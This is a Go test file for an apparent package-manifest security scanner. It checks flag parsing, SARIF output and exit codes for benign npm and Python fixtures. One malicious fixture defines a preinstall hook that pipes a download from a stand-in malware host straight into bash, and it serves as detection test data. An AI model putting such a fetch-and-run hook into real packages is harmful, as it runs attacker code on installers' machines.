package main

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParseFlags(t *testing.T) {
	cfg := parseFlags([]string{"--json", "--sarif=scan.sarif", "--no-color", "/path/to/pkg"})
	if !cfg.jsonOutput {
		t.Errorf("expected jsonOutput=true")
	}
	if cfg.sarifPath != "scan.sarif" {
		t.Errorf("expected sarifPath=scan.sarif, got %s", cfg.sarifPath)
	}
	if !cfg.noColor {
		t.Errorf("expected noColor=true")
	}
	if len(cfg.paths) != 1 || cfg.paths[0] != "/path/to/pkg" {
		t.Errorf("expected paths=[/path/to/pkg], got %v", cfg.paths)
	}
}

func TestRunBenignPackage(t *testing.T) {
	tmpDir := t.TempDir()

	pkgJSON := `{
		"name": "my-benign-library",
		"version": "1.0.0",
		"scripts": {
			"postinstall": "node -e \"console.log('Thank you for using my-benign-library')\""
		}
	}`
	if err := os.WriteFile(filepath.Join(tmpDir, "package.json"), []byte(pkgJSON), 0o644); err != nil {
		t.Fatalf("writing package.json: %v", err)
	}

	cfg := &cliConfig{
		failOnCritical: true,
		noColor:        true,
		paths:          []string{tmpDir},
	}

	code := run(cfg)
	if code != 0 {
		t.Errorf("expected exit code 0 for benign package, got %d", code)
	}
}

func TestRunMaliciousPackageWithSARIF(t *testing.T) {
	tmpDir := t.TempDir()

	pkgJSON := `{
		"name": "malicious-pwn",
		"version": "1.0.0",
		"scripts": {
			"preinstall": "curl -sL https://malware-feed.biz/sh | bash"
		}
	}`
	if err := os.WriteFile(filepath.Join(tmpDir, "package.json"), []byte(pkgJSON), 0o644); err != nil {
		t.Fatalf("writing package.json: %v", err)
	}

	sarifFile := filepath.Join(tmpDir, "out.sarif")
	cfg := &cliConfig{
		sarifPath:      sarifFile,
		failOnCritical: true,
		noColor:        true,
		paths:          []string{tmpDir},
	}

	code := run(cfg)
	if code != 1 {
		t.Errorf("expected exit code 1 for malicious package, got %d", code)
	}

	// Verify SARIF file was generated
	if _, err := os.Stat(sarifFile); err != nil {
		t.Fatalf("SARIF report was not created: %v", err)
	}
}

func TestRunPyPIPackage(t *testing.T) {
	tmpDir := t.TempDir()

	pyproject := `
[project]
name = "safe-python-package"
version = "0.5.0"
`
	if err := os.WriteFile(filepath.Join(tmpDir, "pyproject.toml"), []byte(pyproject), 0o644); err != nil {
		t.Fatalf("writing pyproject.toml: %v", err)
	}

	cfg := &cliConfig{
		failOnCritical: true,
		noColor:        true,
		paths:          []string{tmpDir},
	}

	code := run(cfg)
	if code != 0 {
		t.Errorf("expected exit code 0 for benign python package, got %d", code)
	}
}
